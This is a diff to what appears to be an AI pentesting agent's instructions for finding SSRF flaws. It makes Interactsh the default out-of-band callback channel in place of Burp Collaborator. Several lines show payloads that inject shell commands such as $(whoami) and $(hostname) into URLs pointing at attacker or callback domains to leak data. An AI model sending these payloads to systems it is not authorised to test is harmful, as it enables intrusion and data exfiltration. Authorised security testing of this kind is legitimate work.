@@ -29,7 +29,8 @@ Test for SSRF vulnerabilities by exploiting URL parameters to access internal ne
 - **report_vulnerability** - Report confirmed vulnerabilities
 - **http_replay** - The ONLY way to send test requests: replay a captured request with field mutations (inject URLs, swap headers, encode payloads). Payloads travel as data, no shell escaping needed. Supports encoding pipelines (url, double-url, base64, unicode, html-entity).
 - **http_replay_raw** - Byte-exact send for protocol smuggling or malformed requests that http_replay would normalize.
-- **attack_script ssrf_listener** - TCP callback server for out-of-band (OOB) SSRF evidence.
+- **attack_script ssrf_listener** - TCP callback server for out-of-band (OOB) SSRF evidence (use only when the target can reach YOUR host directly).
+- **attack_script oob_interactsh** - DEFAULT OOB channel: Interactsh blind-callback collector (DNS/HTTP/SMTP/LDAP). `new` prints the payload domain, `poll --state DIR` prints interactions. Use for ALL blind OOB unless the operator explicitly names Burp Collaborator — never default to Burp on your own.
 
 ## Sending Test Requests
 
@@ -248,7 +249,7 @@ http://0x7f.0x0.0x0.0x1
 ```
 http://localhost.company.com (points to 127.0.0.1)
 http://127.0.0.1.nip.io
-http://spoofed.burpcollaborator.net (DNS rebinding)
+http://<your-interactsh-domain> (DNS rebinding / OOB — Burp Collaborator only on explicit operator mention)
 ```
 
 **3. IPv6:**
@@ -298,11 +299,14 @@ http://internal-service:80 (fast response)
 http://internal-service:99999 (timeout = port open check)
 ```
 
-**2. Out-of-Band (OOB):**
+**2. Out-of-Band (OOB) — DEFAULT: Interactsh, not Burp:**
 ```
-http://attacker.burpcollaborator.net
-http://attacker.com/$(whoami).attacker.com
+attack_script oob_interactsh new                     # → payload_domain
+http://<payload_domain>/$(whoami)                    # blind OSCI / SSRF callback
+attack_script oob_interactsh poll --state <DIR>      # read interactions
 ```
+Burp Collaborator ONLY when the operator explicitly names it in this session.
+Never assume it, never default to it.
 
 **3. DNS Exfiltration:**
 ```
@@ -311,8 +315,8 @@ http://$(hostname).attacker.com
 
 **Testing approach:**
 1. Use timing to detect open ports
-2. Use Burp Collaborator or similar for OOB
-3. Monitor for DNS queries to your domain
+2. Use `oob_interactsh` for OOB (Burp Collaborator only on explicit operator mention)
+3. Monitor for DNS queries to your interactsh domain
 4. Check error messages for differences
 
 **Report if:**
